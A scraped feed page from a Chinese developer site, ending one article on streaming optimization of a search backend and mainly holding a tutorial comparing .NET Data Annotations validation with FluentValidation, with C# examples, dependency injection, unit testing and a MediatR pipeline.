<p><strong>业务收益：</strong> 首屏加载速度 获得了显著提升，在热点卡、活动卡等关键场景， 平均提升 14% 以上 。更重要的是，核心业务指标也获得了显著的正向收益，例如搜索总点击率、热点卡点击 UV 等关键指标均有明显增长。</p>
</li>
</ul>
<h3 data-id="heading-11">5. 基于流式的场景化业务优化</h3>
<p>在完成基础链路的流式改造后，搜索服务端架构团队还针对一些特殊业务场景进行了深度优化。例如，在"抗战胜利80周年阅兵"这类重大活动期间，用户搜索相关关键词时，返回的单条结果卡片可能铺满四倍于常规的屏幕高度。在这种情况下，仅仅打包首屏所需的一两个常规组件是远远不够的。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/69cb7a5af51945489eaf8e7c624c7c52~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ2xvdWRXZUdv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764307591&amp;x-signature=XkZ3pPnjpZme%2F0BDuvE7VLorkb4%3D" alt="" loading="lazy"/></p>
<p>搜索服务端架构团队与热点打包服务团队协作，进一步优化了处理流程：API 层请求 Loader 服务后，Loader 会首先动态计算铺满当前首屏所需的全部组件数量，然后优先返回这部分"首屏"数据，剩余数据则在后台流式返回。这一优化在普通场景下能带来平均 14% 的首屏加速，而在阅兵这类特殊场景下，首屏加速效果可高达 50%——其核心在于，渲染耗时完全取决于首屏所需组件的打包速度，无需再等待全量数据的返回。</p>
<h2 data-id="heading-12">三、未来展望：搜索理想架构的流式演进</h2>
<p>目前，搜索服务端架构团队已经成功完成了搜索打包链路的全面流式化，但优化的脚步并未就此停止。放眼整个搜索链路，引擎检索层作为耗时占比最大的环节，其流式改造将是团队未来的核心攻坚方向。</p>
<p>搜索业务的个性化特征极其显著，这意味着最终结果的呈现，高度依赖于复杂的个性化计算。然而，搜索服务端架构团队也观察到，部分结果形态（如热点卡、活动卡等特型卡片）的确定，并不需要等待全量计算完成，其所需的数据往往能够被快速生成。这类本质上的结构化数据，为团队进一步优化提供了可能。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8db443a26b434201b0db179b9b0eeca6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ2xvdWRXZUdv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764307591&amp;x-signature=IHNqaTW86W9CROZLo03LJVaN4QE%3D" alt="" loading="lazy"/></p>
<p>未来期待将流式改造继续向<strong>上游的引擎层</strong>延伸。搜索服务端架构团队计划将 API 层到引擎层，乃至引擎内部的召回与排序链路，都纳入流式优化的范畴。在理想的模式下，当引擎在进行复杂的个性化检索时，可以优先返回能够快速生成的结构化数据（如特型卡），随后再以流式的方式，返回需要复杂计算的个性化内容。
这种模式不仅能将引擎层的耗时进行有效拆分，更能让下游的打包环节第一时间接收到首屏所需的数据并进行处理，最终实现端到端（End-to-End）的搜索链路性能飞跃，为用户带来更快、更流畅的搜索体验。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Web API 参数验证：原生验证 与 FluentValidation 对比]]></title>    <link>https://juejin.cn/post/7574680270538162176</link>    <guid>https://juejin.cn/post/7574680270538162176</guid>    <pubDate>2025-11-21T04:55:36.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7574680270538162176" data-draft-id="7574704948153991220" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Web API 参数验证：原生验证 与 FluentValidation 对比"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-11-21T04:55:36.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="白气急"/> <meta itemprop="url" content="https://juejin.cn/user/3855363959685260"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Web API 参数验证：原生验证 与 FluentValidation 对比
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3855363959685260/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    白气急
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-21T04:55:36.000Z" title="Fri Nov 21 2025 04:55:36 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">原生验证方式</h2>
<p>一般来说，我们对参数做校验时都会采用原生 <code>数据注解+Validator</code> 的方式来进行校验，例如下面的UserDTO</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">internal</span> <span class="hljs-keyword">record</span> <span class="hljs-title">UserDTO</span>
{
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">int</span> Id { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">init</span>; }
​
    [<span class="hljs-meta">Required(ErrorMessage = <span class="hljs-string">"用户名不能为空"</span>)</span>]
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> UserName { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">init</span>; } = <span class="hljs-literal">null</span>!;
​
    [<span class="hljs-meta">Required(ErrorMessage = <span class="hljs-string">"邮箱地址不能为空"</span>)</span>]
    [<span class="hljs-meta">EmailAddress(ErrorMessage = <span class="hljs-string">"邮箱地址格式错误"</span>)</span>]
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span>? Email { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">init</span>; }
​
    [<span class="hljs-meta">Required(ErrorMessage = <span class="hljs-string">"描述1不能为空"</span>)</span>]
    [<span class="hljs-meta">StringLength(120, MinimumLength = 1, ErrorMessage = <span class="hljs-string">"描述1长度必须在1~120个字符之间"</span>)</span>]
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> Description1 { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">init</span>; } = <span class="hljs-literal">null</span>!;
​
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span>? Description2 { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">init</span>; }
}
</code></pre>
<p>使用时可通过 <code>Validator.TryValidateObject</code> 手动触发验证：</p>
<pre><code class="hljs language-ini" lang="ini">var <span class="hljs-attr">user</span> = new UserDTO { /* ... */ }<span class="hljs-comment">;</span>
var <span class="hljs-attr">context</span> = new ValidationContext(user)<span class="hljs-comment">;</span>
var <span class="hljs-attr">results</span> = new List&lt;ValidationResult&gt;()<span class="hljs-comment">;</span>
bool <span class="hljs-attr">isValid</span> = Validator.TryValidateObject(user, context, results, validateAllProperties: <span class="hljs-literal">true</span>)<span class="hljs-comment">;</span>
</code></pre>
<p>这种方式对于<strong>单字段的简单规则</strong>（如非空、长度、格式）非常高效。然而，一旦涉及<strong>跨字段的条件验证</strong>，原生机制就显得力不从心。</p>
<p>例如，现在新增一条业务规则：</p>
<blockquote>
<p><strong>只有当 <code>Description1</code> 有值时，<code>Description2</code> 才允许有值；若 <code>Description1</code> 为空，则 <code>Description2</code> 必须为空。</strong></p>
</blockquote>
<p>这时就不太好办了，只能让 DTO 实现 <code>IValidatableObject</code> 接口，在类内部编写验证逻辑</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">internal</span> <span class="hljs-keyword">record</span> <span class="hljs-title">UserDTO</span> : <span class="hljs-title">IValidatableObject</span> <span class="hljs-comment">//继承 IValidatableObject 接口</span>
{
    <span class="hljs-comment">// ... 属性定义 ...</span>
    
    <span class="hljs-comment">//验证</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> IEnumerable&lt;ValidationResult&gt; <span class="hljs-title">Validate</span>(<span class="hljs-params">ValidationContext context</span>)</span>
    {
        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">string</span>.IsNullOrEmpty(Description1) &amp;&amp; !<span class="hljs-built_in">string</span>.IsNullOrEmpty(Description2))
        {
            <span class="hljs-function"><span class="hljs-keyword">yield</span> <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title">ValidationResult</span>(<span class="hljs-params">
                <span class="hljs-string">"不能在 Description1 为空的情况下填写 Description2"</span>,
                <span class="hljs-keyword">new</span>[] { <span class="hljs-keyword">nameof</span>(Description1</span>), <span class="hljs-title">nameof</span>(<span class="hljs-params">Description2</span>) })</span>;
        }
    }
    
}
</code></pre>
<p>虽然这是 .NET 官方支持的做法，但在实际项目中会带来一些问题：</p>
<ul>
<li>验证逻辑与数据模型耦合，违反 <strong>单一职责原则（SRP）</strong> 和 <strong>关注点分离（SoC）</strong> ；</li>
<li>条件判断需手动编写 <code>if</code> 语句，规则复杂时代码难以维护；</li>
<li>验证逻辑难以独立测试或复用。</li>
</ul>
<p>社区很多大佬也发现了这些问题，也针对这些痛点开发出了很多实用的验证框架，其中 <strong>FluentValidation</strong> 因其流畅的 API、强大的表达能力，成为广泛采用的解决方案</p>
<h2 data-id="heading-1">FluentValidation验证</h2>
<p>与 .NET 原生的 <code>数据注解+Validator</code> 不同，<code>FluentValidation</code> 将验证逻辑从模型中分离出来，更适合构建<strong>高内聚、低耦合</strong>的应用程序，尤其是在 DDD（领域驱动设计）和 整洁架构<code>(Clean Architecture)</code> 中被广泛采用。以下是它的一些核心特点</p>





























<table><thead><tr><th>特性</th><th>说明</th></tr></thead><tbody><tr><td><strong>流畅 API</strong></td><td>使用链式语法定义规则，代码直观易读</td></tr><tr><td><strong>验证与模型分离</strong></td><td>验证逻辑写在独立的验证器类中，不污染 DTO/实体</td></tr><tr><td><strong>支持复杂条件验证</strong></td><td>如“字段 A 为空时，字段 B 必填”等跨字段规则</td></tr><tr><td><strong>内置丰富验证规则</strong></td><td>非空、长度、正则、邮箱、范围、集合、异步验证等</td></tr><tr><td><strong>高度可扩展</strong></td><td>支持自定义验证器、条件、消息模板、本地化等</td></tr></tbody></table>
<h3 data-id="heading-2">使用说明</h3>
<p>在使用<code>FluentValidation</code> 时，我们需要对每个业务逻辑或验证对象写出一个对应的继承了<code>AbstractValidator&lt;T&gt;</code>的验证类，并在构造方法中实现验证逻辑，以下还拿前面提到的<code>UserDTO</code>举例</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">//移除验证逻辑，只负责作为贫血模型来传输数据</span>
<span class="hljs-keyword">internal</span> <span class="hljs-keyword">record</span> <span class="hljs-title">UserDTO</span>
{
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">int</span> Id { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">init</span>; }
​
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> UserName { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">init</span>; } = <span class="hljs-literal">null</span>!;
    
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span>? Email { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">init</span>; }
​
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> Description1 { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">init</span>; } = <span class="hljs-literal">null</span>!;
​
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span>? Description2 { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">init</span>; }
}
</code></pre>
<pre><code class="hljs language-scss" lang="scss">public class UserDTOValidator : AbstractValidator&lt;UserDTO&gt;
{
    public <span class="hljs-built_in">UserDTOValidator</span>()
    {
        <span class="hljs-comment">//非空验证</span>
        <span class="hljs-built_in">RuleFor</span>(x =&gt; x.UserName)
            <span class="hljs-selector-class">.NotNull</span>()<span class="hljs-selector-class">.NotEmpty</span>()<span class="hljs-selector-class">.WithMessage</span>("用户名不能为空");
        
        <span class="hljs-comment">//正则验证 仅作为扩展示例，原模型中不包含此字段</span>
        <span class="hljs-built_in">RuleFor</span>(x =&gt; x.PhoneNumber)
            <span class="hljs-selector-class">.Matches</span>(@"^<span class="hljs-number">1</span>[<span class="hljs-number">3</span>-<span class="hljs-number">9</span>]\d{<span class="hljs-number">9</span>}$")<span class="hljs-selector-class">.WithMessage</span>("手机号格式错误");
        
        <span class="hljs-comment">//邮箱验证</span>
        <span class="hljs-built_in">RuleFor</span>(x =&gt; x.Email)
            <span class="hljs-selector-class">.NotEmpty</span>()<span class="hljs-selector-class">.WithMessage</span>("邮箱不能为空")
            <span class="hljs-selector-class">.EmailAddress</span>()<span class="hljs-selector-class">.WithMessage</span>("邮箱格式不正确");
        
       <span class="hljs-comment">//实现较为复杂验证逻辑的方式1</span>
        <span class="hljs-built_in">RuleFor</span>(x =&gt; x.Description1)
            <span class="hljs-selector-class">.NotEmpty</span>()<span class="hljs-selector-class">.When</span>(x =&gt; !string.IsNullOrWhiteSpace(x.Description2))<span class="hljs-selector-class">.WithMessage</span>("不能在 Description1 为空的情况下填写 Description2");
        
        <span class="hljs-comment">//如果不想使用以上语法的话，可以使用Custom/CustomAsync的方式来进行自定义设置，但是阅读起来比较费劲</span>
        <span class="hljs-built_in">RuleFor</span>(x =&gt; x.Description1)<span class="hljs-selector-class">.Custom</span>((x, context) =&gt;
        {
            <span class="hljs-selector-tag">var</span> model = context<span class="hljs-selector-class">.InstanceToValidate</span>;
            if (!string.IsNullOrWhiteSpace(model.Description2) &amp;&amp; string<span class="hljs-selector-class">.IsNullOrWhiteSpace</span>(model.Description1))
            {
                context<span class="hljs-selector-class">.AddFailure</span>("不能在 Description1 为空的情况下填写 Description2");
            }
        });
    }
}
</code></pre>
<p>除此之外，还有预定义的很多验证方法，例如<code>GreaterThanOrEqualTo</code>验证数值最小值，<code>LessThanOrEqualTo</code>验证数值最大值，对于自定义类使用<code>Must</code>来验证类内部的属性等，在结尾会有常用方法与说明</p>
<h3 data-id="heading-3">使用方式</h3>
<p>定义好<code>UserDTOValidator</code>验证器后，我们可以通过多种方式在应用中执行验证逻辑。常见的方式包括以下几种</p>
<h4 data-id="heading-4">1. 手动调用验证</h4>
<p>这是最基础且简单通用的方式，不依赖框架</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Test</span>(<span class="hljs-params">UserDTO user</span>)</span>
{
    <span class="hljs-keyword">var</span> validator = <span class="hljs-keyword">new</span> UserDTOValidator();
    ValidationResult result = validator.Validate(request);
    <span class="hljs-comment">// 或异步验证</span>
    <span class="hljs-keyword">var</span> result = <span class="hljs-keyword">await</span> validator.ValidateAsync(request);
    <span class="hljs-keyword">if</span> (!result.IsValid)
    {
        <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">var</span> failure <span class="hljs-keyword">in</span> result.Errors)
        {
            <span class="hljs-comment">//做对应错误信息处理</span>
            Console.WriteLine(<span class="hljs-string">$"<span class="hljs-subst">{failure.PropertyName}</span>: <span class="hljs-subst">{failure.ErrorMessage}</span>"</span>);
        }
    }
}
</code></pre>
<h4 data-id="heading-5">2. 通过依赖注入实现验证</h4>
<ol start="0">
<li>
<h5 data-id="heading-6">手动验证</h5>
</li>
</ol>
<p>首先是在Program.cs中注册对应的服务</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//一次性注册全部相关服务的两种方式</span>
<span class="hljs-comment">//第一种</span>
builder<span class="hljs-selector-class">.Services</span><span class="hljs-selector-class">.AddValidatorsFromAssemblyContaining</span>&lt;Program&gt;();<span class="hljs-comment">//其中 Program 是验证类所在的程序集中的类</span>
<span class="hljs-comment">//第二种</span>
builder<span class="hljs-selector-class">.Services</span><span class="hljs-selector-class">.AddValidatorsFromAssembly</span>(typeof(Program)<span class="hljs-selector-class">.Assembly</span>);
</code></pre>
<p>然后在对应Controller中构造出对应服务</p>
<pre><code class="hljs language-csharp" lang="csharp">[<span class="hljs-meta">ApiController</span>]
[<span class="hljs-meta">Route(<span class="hljs-string">"test"</span>)</span>]
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">TestController</span> : <span class="hljs-title">ControllerBase</span>
{
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> IValidator&lt;UserDTO&gt; _validator;
​
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">TestController</span>(<span class="hljs-params">IValidator&lt;UserDTO&gt; validator</span>)</span>
    {
        _validator = validator; 
    }
​
    [<span class="hljs-meta">HttpPost</span>]
    [<span class="hljs-meta">Route(<span class="hljs-string">"test"</span>)</span>]
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> Task&lt;ActionResult&lt;List&lt;<span class="hljs-built_in">string</span>&gt;&gt;&gt; Test([FromBody] UserDTO request)
    {
        List&lt;<span class="hljs-built_in">string</span>&gt; errors = <span class="hljs-keyword">new</span>();
        <span class="hljs-keyword">var</span> result = <span class="hljs-keyword">await</span> _validator.ValidateAsync(request);
        <span class="hljs-keyword">if</span>(!result.IsValid)
        {
            result.Errors.ForEach(x =&gt; errors.Add(<span class="hljs-string">$"<span class="hljs-subst">{x.PropertyName}</span>:<span class="hljs-subst">{x.ErrorMessage}</span>"</span>));
            <span class="hljs-keyword">return</span> BadRequest(errors);
        }
        <span class="hljs-keyword">return</span> Ok(result);
    }
}
</code></pre>
<ol start="2">
<li>
<h5 data-id="heading-7">自动验证（不推荐 / 已弃用集成方式）</h5>
<p>官方不再推荐将 FluentValidation 集成到 ASP.NET Core 的内置模型验证管道中，而是建议显式调用验证器。所以对应的实现这里就不举例说明了</p>
</li>
</ol>
<p>以下是官方不推荐的原文以及翻译</p>
<blockquote>
<ul>
<li><strong>The ASP.NET validation pipeline is not asynchronous</strong>: If your validator contains asynchronous rules then your validator will not be able to run. You will receive an exception at runtime if you attempt to use an asynchronous validator with auto-validation. <strong>ASP.NET 验证管道不支持异步操作</strong>：如果你的验证器包含异步规则，则无法通过该管道执行。若在启用自动验证的情况下使用异步验证器，运行时将抛出异常</li>
<li><strong>It is MVC-only</strong>: This approach for auto-validation only works with MVC Controllers and Razor Pages. It does not work with the more modern parts of ASP.NET such as Minimal APIs or Blazor. <strong>仅限 MVC 使用</strong>：此自动验证方式仅适用于 MVC 控制器和 Razor Pages，无法用于 ASP.NET Core 中更现代的编程模型，例如 Minimal API 或 Blazor</li>
<li><strong>It is harder to debug</strong>: The ‘magic’ nature of auto-validation makes it hard to debug/troubleshoot if something goes wrong as so much is done behind the scenes. <strong>调试难度较高</strong>：由于自动验证在幕后隐式执行大量逻辑，其“黑盒”特性使得在出现问题时难以定位和排查错误</li>
</ul>
</blockquote>
<p>因此，在新项目中，推荐采用<strong>依赖注入 + 显式调用 <code>ValidateAsync</code></strong> 的方式，既能支持异步规则，又兼容 Minimal API、Blazor 等架构，同时也便于单元测试和错误定制</p>
<h4 data-id="heading-8">3. 单元测试</h4>
<p>由于验证器是独立类，我们可以轻松为其编写单元测试，无需构造复杂的模型或依赖 Web 上下文</p>
<pre><code class="hljs language-ini" lang="ini">    <span class="hljs-section">[TestMethod]</span>
    public void MyTestMethod()
    {
        // Arrange
        var <span class="hljs-attr">validator</span> = new UserDTOValidator()<span class="hljs-comment">;</span>
​
        // Act
        var <span class="hljs-attr">result</span> = validator.TestValidate(new UserDTO 
        { 
            <span class="hljs-attr">Description1</span> = <span class="hljs-string">""</span>, 
            <span class="hljs-attr">Description2</span> = <span class="hljs-string">"test"</span> 
        })<span class="hljs-comment">;</span>
​
        // Assert
        result.ShouldHaveValidationErrorFor(<span class="hljs-attr">x</span> =&gt; x.Description1)<span class="hljs-comment">;</span>
    }
</code></pre>
<h4 data-id="heading-9">4. 进阶方案：搭配MediatR 中使用</h4>
<p>在 CQRS 模式中，通常在 Command/QueryHandler 前会自动进行验证。 <code>注：MediatR会在后续其它文档中讲述</code></p>
<p>写一个Behavior</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">ValidationBehavior</span>&lt;<span class="hljs-title">TRequest</span>, <span class="hljs-title">TResponse</span>&gt; : <span class="hljs-title">IPipelineBehavior</span>&lt;<span class="hljs-title">TRequest</span>, <span class="hljs-title">TResponse</span>&gt;
    <span class="hljs-keyword">where</span> <span class="hljs-title">TRequest</span> : <span class="hljs-title">IRequest</span>&lt;<span class="hljs-title">TResponse</span>&gt;
{
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> IEnumerable&lt;IValidator&lt;TRequest&gt;&gt; _validators;
​
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">ValidationBehavior</span>(<span class="hljs-params">IEnumerable&lt;IValidator&lt;TRequest&gt;&gt; validators</span>)</span>
    {
        _validators = validators;
    }
​
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> Task&lt;TResponse&gt; <span class="hljs-title">Handle</span>(<span class="hljs-params">TRequest request, RequestHandlerDelegate&lt;TResponse&gt; next, CancellationToken ct</span>)</span>
    {
        <span class="hljs-keyword">var</span> context = <span class="hljs-keyword">new</span> ValidationContext&lt;TRequest&gt;(request);
        <span class="hljs-keyword">var</span> failures = _validators
            .Select(v =&gt; v.Validate(context))
            .SelectMany(result =&gt; result.Errors)
            .Where(failure =&gt; failure != <span class="hljs-literal">null</span>)
            .ToList();
​
        <span class="hljs-keyword">if</span> (failures.Any())
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ValidationException(failures);
​
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> next();
    }
}
</code></pre>
<p>并且注册对应服务</p>
<blockquote>
<p>builder.Services.AddTransient(typeof(IPipelineBehavior&lt;,&gt;), typeof(ValidationBehavior&lt;,&gt;));</p>
</blockquote>
<p>通过以上几种方式，我们可以灵活地将 FluentValidation 集成到各类 .NET 应用中——无论是简单的控制器手动调用，还是结合 CQRS 模式的自动管道验证。选择哪种方式，取决于项目的架构复杂度和对可维护性的要求。</p>
<hr/>
<h3 data-id="heading-10">附录</h3>
<h4 data-id="heading-11">原生验证与FluentValidation优劣势对比</h4>




























































<table><thead><tr><th>对比维度</th><th>原生验证（Data Annotations）</th><th>FluentValidation</th></tr></thead><tbody><tr><td><strong>定义方式</strong></td><td>在 DTO/Model 类上直接使用特性（<code>[Required]</code>, <code>[EmailAddress]</code>）</td><td>通过独立的验证类（继承 <code>AbstractValidator&lt;T&gt;</code>）集中编写验证逻辑</td></tr><tr><td><strong>代码耦合度</strong></td><td>高：验证逻辑与模型强耦合，违反“关注点分离”原则</td><td>低：验证逻辑与模型完全解耦，模型保持“贫血”和纯净</td></tr><tr><td><strong>可读性与维护性</strong></td><td>简单场景下很清晰，复杂场景难以维护</td><td>验证规则集中、结构清晰，支持链式语法，易于阅读和维护</td></tr><tr><td><strong>条件验证支持</strong></td><td>需要自定义 <code>ValidationAttribute</code></td><td>原生支持 <code>.When()</code>, <code>.Unless()</code> 等条件判断</td></tr><tr><td><strong>异步验证支持</strong></td><td>不支持异步</td><td>支持 <code>ValidateAsync()</code> 和 <code>CustomAsync()</code></td></tr><tr><td><strong>跨属性/复杂业务验证</strong></td><td>困难：需编写自定义验证特性，复用性差</td><td>简单：可在 <code>RuleFor</code> 或 <code>Custom</code> 中直接访问整个对象实例</td></tr><tr><td><strong>测试友好性</strong></td><td>较差：验证逻辑分散在属性上，难以单元测试</td><td>优秀：验证器是独立类，可轻松进行单元测试</td></tr><tr><td><strong>自动集成 MVC 模型验证</strong></td><td>开箱即用</td><td>旧版支持自动集成，新版<strong>不推荐</strong></td></tr><tr><td><strong>学习成本</strong></td><td>低：内置、简单直观</td><td>中：需学习 Fluent API 和验证器注册机制</td></tr><tr><td><strong>适用场景</strong></td><td>简单表单、快速原型、小型项目</td><td>中大型项目、复杂业务规则、需要高可维护性和扩展性的系统</td></tr></tbody></table>
